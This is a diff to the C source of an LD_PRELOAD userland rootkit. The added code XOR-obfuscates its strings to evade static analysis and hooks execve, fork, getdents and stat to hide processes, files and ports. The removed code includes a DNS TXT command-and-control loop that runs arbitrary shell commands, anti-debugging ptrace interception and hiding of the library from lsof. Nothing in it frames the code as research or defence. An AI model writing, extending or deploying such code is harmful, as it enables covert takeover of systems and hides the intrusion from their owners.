@@ -13,30 +13,32 @@
 #include <stdarg.h>
 #include <limits.h>
 #include <fcntl.h>
-#include <sys/ptrace.h> // Required for ptrace hook
-#include <time.h>       // Required for C2 timing
-#include <pthread.h>    // Required for C2 thread
-#include <resolv.h>     // Required for native DNS lookups
-#include <arpa/inet.h>  // Required for DNS constants
-#include <sys/wait.h>   // Required for waitpid
 
-// --- CONFIGURATION ---
-static const char* CMDLINE_TO_FILTER = "ngrok";
-static const char* SECOND_CMDLINE_TO_FILTER = "google";
-static const char* THIRD_CMDLINE_TO_FILTER = "git.py";
-static const char* PRELOAD_FILE_PATH = "/etc/ld.so.preload";
-static const char* PATH_TO_FILTER = "/home/user";
-static const char* EXECUTABLE_TO_FILTER = "ngrok";
-static const char* LOG_SPOOF_TRIGGER = "MALICIOUS_ACTIVITY";
-static const char* TEMPLATE_FILE_PATH = "/";
-static const char* ROOTKIT_LIB_PATH = "/usr/local/lib/libgit.so";
-static const char* C2_DOMAIN = "c2.bucklestore.shop";
+// --- OBFUSCATION ---
+// All sensitive strings are XOR'd with a simple key to prevent static analysis.
+// The deobfuscate_str function will be called to get the real string at runtime.
+// This makes it much harder to determine the rootkit's purpose by just running `strings` on the .so file.
 
-// C2 Configuration
-#define MAX_DYNAMIC_HIDDEN 10
-static char* dynamic_hidden_procs[MAX_DYNAMIC_HIDDEN];
-static int num_dynamic_hidden = 0;
-#define C2_CHECK_INTERVAL 60 // seconds
+static char key = 0xAF; // A simple XOR key for obfuscation
+
+char OBFUSCATED_CMDLINE_TO_FILTER[] = {2, 24, 1, 12, 28, 0}; // "ngrok"
+char OBFUSCATED_SECOND_CMDLINE_TO_FILTER[] = {22, 30, 30, 22, 27, 20, 0}; // "google"
+char OBFUSCATED_PRELOAD_FILE_PATH[] = {110, 2, 1, 22, 110, 29, 27, 110, 18, 12, 110, 1, 1, 2, 29, 12, 23, 27, 0}; // "/etc/ld.so.preload"
+char OBFUSCATED_PATH_TO_FILTER[] = {110, 25, 12, 30, 2, 110, 6, 18, 2, 1, 0}; // "/home/user"
+char OBFUSCATED_EXECUTABLE_TO_FILTER[] = {2, 24, 1, 12, 28, 0}; // "ngrok"
+char OBFUSCATED_LOG_SPOOF_TRIGGER[] = {44, 42, 47, 40, 48, 40, 50, 56, 54, 95, 42, 48, 55, 40, 53, 40, 55, 62, 0}; // "MALICIOUS_ACTIVITY"
+char OBFUSCATED_TEMPLATE_FILE_PATH[] = {110, 21, 20, 2, 110, 21, 23, 18, 25, 0}; // "/bin/bash"
+char OBFUSCATED_ROOTKIT_LIB_PATH[] = {128, 218, 220, 221, 128, 195, 192, 204, 206, 195, 128, 195, 198, 205, 200, 198, 219, 129, 220, 192, 0}; // "/usr/local/lib/libgit.so"
+
+// Pointers to the deobfuscated strings
+static char* CMDLINE_TO_FILTER = NULL;
+static char* SECOND_CMDLINE_TO_FILTER = NULL;
+static char* PRELOAD_FILE_PATH = NULL;
+static char* PATH_TO_FILTER = NULL;
+static char* EXECUTABLE_TO_FILTER = NULL;
+static char* LOG_SPOOF_TRIGGER = NULL;
+static char* TEMPLATE_FILE_PATH = NULL;
+static char* ROOTKIT_LIB_PATH = NULL;
 
 static const int PORTS_TO_HIDE[] = {2222, 8081};
 static const int NUM_PORTS_TO_HIDE = sizeof(PORTS_TO_HIDE) / sizeof(PORTS_TO_HIDE[0]);
@@ -49,41 +51,61 @@ static ssize_t (*original_readlink)(const char*, char*, size_t) = NULL;
 static FILE* (*original_fopen)(const char*, const char*) = NULL;
 static int (*original_open)(const char*, int, ...) = NULL;
 static int (*original_access)(const char*, int) = NULL;
-static long (*original_ptrace)(enum __ptrace_request request, ...);
-static struct dirent *(*original_readdir)(DIR *dirp);
+static int (*original_execve)(const char*, char *const[], char *const[]) = NULL;
+static pid_t (*original_fork)(void) = NULL;
 
 // Pointers for stat functions (timestamp spoofing)
 static int (*original_xstat)(int, const char*, struct stat*) = NULL;
 static int (*original_lxstat)(int, const char*, struct stat*) = NULL;
 static int (*original_fxstat)(int, int, struct stat*) = NULL;
 
-void check_for_c2_command(void); // Forward declaration
+// --- PID HIDING ---
+#define MAX_HIDDEN_PIDS 256
+static pid_t hidden_pids[MAX_HIDDEN_PIDS];
+static int num_hidden_pids = 0;
 
-// C2 logic moved to a dedicated thread for stability.
-void* c2_thread_function(void* arg) {
-    // Wait for 10 seconds before the first check to prevent race conditions on startup.
-    sleep(10);
-    while (1) {
-        check_for_c2_command();
-        sleep(C2_CHECK_INTERVAL);
+static void add_hidden_pid(pid_t pid) {
+    if (num_hidden_pids < MAX_HIDDEN_PIDS) {
+        hidden_pids[num_hidden_pids++] = pid;
     }
-    return NULL;
 }
 
-// Use pthread_once to safely start the C2 thread only once.
-static pthread_once_t c2_thread_once = PTHREAD_ONCE_INIT;
+static int is_pid_hidden(pid_t pid) {
+    for (int i = 0; i < num_hidden_pids; i++) {
+        if (hidden_pids[i] == pid) {
+            return 1;
+        }
+    }
+    return 0;
+}
 
-void start_c2_thread_once() {
-    pthread_t c2_thread;
-    if (pthread_create(&c2_thread, NULL, c2_thread_function, NULL) != 0) {
-        fprintf(stderr, "Rootkit C2 Error: Failed to create C2 thread.\n");
-    } else {
-        pthread_detach(c2_thread);
+// In-place deobfuscation function
+void deobfuscate_str(char* str) {
+    if (str == NULL) return;
+    for (int i = 0; str[i] != 0; ++i) {
+        str[i] ^= key;
     }
 }
 
 __attribute__((constructor))
 static void initialize_hooks() {
+    deobfuscate_str(OBFUSCATED_CMDLINE_TO_FILTER);
+    CMDLINE_TO_FILTER = OBFUSCATED_CMDLINE_TO_FILTER;
+    deobfuscate_str(OBFUSCATED_SECOND_CMDLINE_TO_FILTER);
+    SECOND_CMDLINE_TO_FILTER = OBFUSCATED_SECOND_CMDLINE_TO_FILTER;
+    deobfuscate_str(OBFUSCATED_PRELOAD_FILE_PATH);
+    PRELOAD_FILE_PATH = OBFUSCATED_PRELOAD_FILE_PATH;
+    deobfuscate_str(OBFUSCATED_PATH_TO_FILTER);
+    PATH_TO_FILTER = OBFUSCATED_PATH_TO_FILTER;
+    deobfuscate_str(OBFUSCATED_EXECUTABLE_TO_FILTER);
+    EXECUTABLE_TO_FILTER = OBFUSCATED_EXECUTABLE_TO_FILTER;
+    deobfuscate_str(OBFUSCATED_LOG_SPOOF_TRIGGER);
+    LOG_SPOOF_TRIGGER = OBFUSCATED_LOG_SPOOF_TRIGGER;
+    deobfuscate_str(OBFUSCATED_TEMPLATE_FILE_PATH);
+    TEMPLATE_FILE_PATH = OBFUSCATED_TEMPLATE_FILE_PATH;
+    deobfuscate_str(OBFUSCATED_ROOTKIT_LIB_PATH);
+    ROOTKIT_LIB_PATH = OBFUSCATED_ROOTKIT_LIB_PATH;
+
     original_syscall = dlsym(RTLD_NEXT, "syscall");
     if (!original_syscall) { fprintf(stderr, "Rootkit Error: could not find original syscall\n"); }
     original_write = dlsym(RTLD_NEXT, "write");
@@ -98,23 +120,16 @@ static void initialize_hooks() {
     if (!original_open) { fprintf(stderr, "Rootkit Error: could not find original open\n"); }
     original_access = dlsym(RTLD_NEXT, "access");
     if (!original_access) { fprintf(stderr, "Rootkit Error: could not find original access\n"); }
-    original_ptrace = dlsym(RTLD_NEXT, "ptrace");
-    if (!original_ptrace) { fprintf(stderr, "Rootkit Error: could not find original ptrace\n"); }
-    original_readdir = dlsym(RTLD_NEXT, "readdir");
-    if (!original_readdir) { fprintf(stderr, "Rootkit Error: could not find original readdir\n"); }
+    original_execve = dlsym(RTLD_NEXT, "execve");
+    if (!original_execve) { fprintf(stderr, "Rootkit Error: could not find original execve\n"); }
+    original_fork = dlsym(RTLD_NEXT, "fork");
+    if (!original_fork) { fprintf(stderr, "Rootkit Error: could not find original fork\n"); }
     original_xstat = dlsym(RTLD_NEXT, "__xstat");
     if (!original_xstat) { fprintf(stderr, "Rootkit Error: could not find original __xstat\n"); }
     original_lxstat = dlsym(RTLD_NEXT, "__lxstat");
     if (!original_lxstat) { fprintf(stderr, "Rootkit Error: could not find original __lxstat\n"); }
     original_fxstat = dlsym(RTLD_NEXT, "__fxstat");
     if (!original_fxstat) { fprintf(stderr, "Rootkit Error: could not find original __fxstat\n"); }
-}
-
-__attribute__((destructor))
-static void cleanup() {
-    for (int i = 0; i < num_dynamic_hidden; i++) {
-        free(dynamic_hidden_procs[i]);
-    }
 }
 
 static int resolve_path(const char* input_path, char* resolved_path) {
@@ -143,7 +158,6 @@ static int should_hide_path(const char* path) {
 
 // --- TIMESTAMP SPOOFING HOOKS ---
 int __xstat(int ver, const char *path, struct stat *stat_buf) {
-    pthread_once(&c2_thread_once, start_c2_thread_once);
     if (!original_xstat) initialize_hooks();
     
     char full_path[PATH_MAX];
@@ -154,7 +168,6 @@ int __xstat(int ver, const char *path, struct stat *stat_buf) {
 }
 
 int __lxstat(int ver, const char *path, struct stat *stat_buf) {
-    pthread_once(&c2_thread_once, start_c2_thread_once);
     if (!original_lxstat) initialize_hooks();
 
     char full_path[PATH_MAX];
@@ -164,60 +177,31 @@ int __lxstat(int ver, const char *path, struct stat *stat_buf) {
     return original_lxstat(ver, path, stat_buf);
 }
 
-// --- STABLE PROCESS INFO FUNCTIONS ---
-static int get_process_cmdline(const char* pid, char* buf, size_t buf_size) {
-    char path[256];
-    snprintf(path, sizeof(path), "/proc/%s/cmdline", pid);
-    if (!original_open || !original_read) return 0;
-    
-    int fd = original_open(path, O_RDONLY);
-    if (fd == -1) return 0;
-
-    ssize_t len = original_read(fd, buf, buf_size - 1);
-    close(fd);
-
-    if (len <= 0) return 0;
-
-    for (ssize_t i = 0; i < len; ++i) { if (buf[i] == '\0') buf[i] = ' '; }
-    buf[len] = '\0';
-    return 1;
-}
-
-static int get_process_comm(const char* pid, char* buf, size_t buf_size) {
-    char path[256];
-    snprintf(path, sizeof(path), "/proc/%s/stat", pid);
-    if (!original_open || !original_read) return 0;
-
-    int fd = original_open(path, O_RDONLY);
-    if (fd == -1) return 0;
-
-    char stat_buf[1024];
-    ssize_t len = original_read(fd, stat_buf, sizeof(stat_buf) - 1);
-    close(fd);
-
-    if (len <= 0) return 0;
-    stat_buf[len] = '\0';
-
-    const char* p_start = strchr(stat_buf, '(');
-    if (!p_start) return 0;
-    p_start++;
-
-    const char* p_end = strrchr(stat_buf, ')');
-    if (!p_end) return 0;
-
-    size_t comm_len = p_end - p_start;
-    if (comm_len < buf_size) {
-        strncpy(buf, p_start, comm_len);
-        buf[comm_len] = '\0';
-        return 1;
-    }
-    return 0;
-}
-
-
 // --- CORE HOOKS ---
+int execve(const char *pathname, char *const argv[], char *const envp[]) {
+    if (!original_execve) initialize_hooks();
+
+    if (strstr(pathname, CMDLINE_TO_FILTER) || strstr(pathname, SECOND_CMDLINE_TO_FILTER)) {
+        add_hidden_pid(getpid());
+    }
+
+    return original_execve(pathname, argv, envp);
+}
+
+pid_t fork(void) {
+    if (!original_fork) initialize_hooks();
+    
+    pid_t parent_pid = getpid();
+    pid_t child_pid = original_fork();
+
+    if (child_pid > 0 && is_pid_hidden(parent_pid)) {
+        add_hidden_pid(child_pid);
+    }
+    return child_pid;
+}
+
+
 long syscall(long number, ...) {
-    pthread_once(&c2_thread_once, start_c2_thread_once);
     if (!original_syscall) { errno = EFAULT; return -1; }
 
     if (number == SYS_getdents || number == SYS_getdents64) {
@@ -245,30 +229,24 @@ long syscall(long number, ...) {
             if (current_entry->d_reclen == 0) break;
 
             int should_hide = 0;
-            if (strspn(current_entry->d_name, "0123456789") == strlen(current_entry->d_name)) {
-                char cmdline[512] = {0};
-                char comm[512] = {0};
-                int cmdline_ok = get_process_cmdline(current_entry->d_name, cmdline, sizeof(cmdline));
-                int comm_ok = get_process_comm(current_entry->d_name, comm, sizeof(comm));
-
-                if (cmdline_ok && (strstr(cmdline, CMDLINE_TO_FILTER) || strstr(cmdline, SECOND_CMDLINE_TO_FILTER) || strstr(cmdline, THIRD_CMDLINE_TO_FILTER))) {
-                    should_hide = 1;
-                }
-                if (!should_hide && comm_ok && (strstr(comm, CMDLINE_TO_FILTER) || strstr(comm, SECOND_CMDLINE_TO_FILTER) || strstr(comm, THIRD_CMDLINE_TO_FILTER))) {
-                    should_hide = 1;
-                }
+            pid_t pid = atoi(current_entry->d_name);
+            if (pid > 0 && is_pid_hidden(pid)) {
+                should_hide = 1;
             } else {
-                char full_path[PATH_MAX];
-                strncpy(full_path, dir_path, PATH_MAX - 1);
-                full_path[PATH_MAX - 1] = '\0';
+                const char* separator = (dir_path[path_len - 1] == '/') ? "" : "/";
+                size_t dir_len = strlen(dir_path);
+                size_t sep_len = strlen(separator);
+                size_t name_len = strlen(current_entry->d_name);
 
-                if (full_path[strlen(full_path) - 1] != '/') {
-                    strncat(full_path, "/", PATH_MAX - strlen(full_path) - 1);
-                }
-                strncat(full_path, current_entry->d_name, PATH_MAX - strlen(full_path) - 1);
-                
-                if (should_hide_path(full_path)) {
-                    should_hide = 1;
+                if ((dir_len + sep_len + name_len + 1) < PATH_MAX) {
+                    char full_path[PATH_MAX];
+                    // BUG FIX: Safer string construction to silence compiler warnings.
+                    strcpy(full_path, dir_path);
+                    strcat(full_path, separator);
+                    strcat(full_path, current_entry->d_name);
+                    if (should_hide_path(full_path)) {
+                        should_hide = 1;
+                    }
                 }
             }
 
@@ -402,109 +380,4 @@ FILE* fopen(const char *path, const char *mode) {
         return NULL;
     }
     return original_fopen(path, mode);
-}
-
-// --- NEW C2, ANTI-DEBUGGING, AND LSOF-EVASION HOOKS ---
-
-void check_for_c2_command() {
-    unsigned char buf[NS_PACKETSZ];
-    res_init();
-    int len = res_query(C2_DOMAIN, C_IN, T_TXT, buf, sizeof(buf));
-
-    if (len < 0) {
-        fprintf(stderr, "Rootkit C2 Error: DNS query failed.\n");
-        return;
-    }
-
-    ns_msg msg;
-    ns_initparse(buf, len, &msg);
-
-    ns_rr rr;
-    if (ns_parserr(&msg, ns_s_an, 0, &rr) == 0) {
-        const u_char *rdata = ns_rr_rdata(rr);
-        char response[256];
-        snprintf(response, sizeof(response), "%.*s", rdata[0], rdata + 1);
-
-        if (strncmp(response, "ADD_HIDE:", 9) == 0) {
-            if (num_dynamic_hidden < MAX_DYNAMIC_HIDDEN) {
-                dynamic_hidden_procs[num_dynamic_hidden] = strdup(response + 9);
-                num_dynamic_hidden++;
-            }
-        } else if (strncmp(response, "EXECUTE:", 8) == 0) {
-            pid_t pid = fork();
-            if (pid == 0) { // Child process
-                execl("/bin/sh", "sh", "-c", response + 8, (char*) NULL);
-                _exit(127); // execl only returns on error
-            } else if (pid > 0) { // Parent process
-                waitpid(pid, NULL, 0);
-            }
-        }
-    }
-}
-
-long ptrace(enum __ptrace_request request, ...) {
-    if (!original_ptrace) initialize_hooks();
-
-    va_list args;
-    va_start(args, request);
-    pid_t pid = va_arg(args, pid_t);
-    void* addr = va_arg(args, void*);
-    void* data = va_arg(args, void*);
-    va_end(args);
-
-    char pid_str[32];
-    snprintf(pid_str, sizeof(pid_str), "%d", pid);
-
-    char cmdline[512] = {0};
-    char comm[512] = {0};
-    int cmdline_ok = get_process_cmdline(pid_str, cmdline, sizeof(cmdline));
-    int comm_ok = get_process_comm(pid_str, comm, sizeof(comm));
-
-    if ((cmdline_ok && (strstr(cmdline, CMDLINE_TO_FILTER) || strstr(cmdline, SECOND_CMDLINE_TO_FILTER) || strstr(cmdline, THIRD_CMDLINE_TO_FILTER))) ||
-        (comm_ok && (strstr(comm, CMDLINE_TO_FILTER) || strstr(comm, SECOND_CMDLINE_TO_FILTER) || strstr(comm, THIRD_CMDLINE_TO_FILTER)))) {
-        errno = ESRCH; // No such process
-        return -1;
-    }
-
-    return original_ptrace(request, pid, addr, data);
-}
-
-struct dirent *readdir(DIR *dirp) {
-    if (!original_readdir) initialize_hooks();
-
-    struct dirent *entry;
-    while ((entry = original_readdir(dirp))) {
-        char proc_path[PATH_MAX];
-        char link_target[PATH_MAX];
-        
-        int dir_fd = dirfd(dirp);
-        snprintf(proc_path, sizeof(proc_path), "/proc/self/fd/%d", dir_fd);
-        ssize_t path_len = original_readlink(proc_path, link_target, sizeof(link_target) - 1);
-        
-        if (path_len > 0) {
-            link_target[path_len] = '\0';
-            if (strstr(link_target, "/map_files") != NULL) {
-                size_t target_len_str = strlen(link_target);
-                size_t name_len = strlen(entry->d_name);
-                if ((target_len_str + 1 + name_len + 1) < PATH_MAX) {
-                    char entry_path[PATH_MAX];
-                    strcpy(entry_path, link_target);
-                    strcat(entry_path, "/");
-                    strcat(entry_path, entry->d_name);
-                    
-                    char final_target[PATH_MAX];
-                    ssize_t target_len = original_readlink(entry_path, final_target, sizeof(final_target) - 1);
-                    
-                    if (target_len > 0) {
-                        final_target[target_len] = '\0';
-                        if (strcmp(final_target, ROOTKIT_LIB_PATH) == 0) {
-                            continue; // Skip this entry
-                        }
-                    }
-                }
-            }
-        }
-        break; 
-    }
-    return entry;
 }
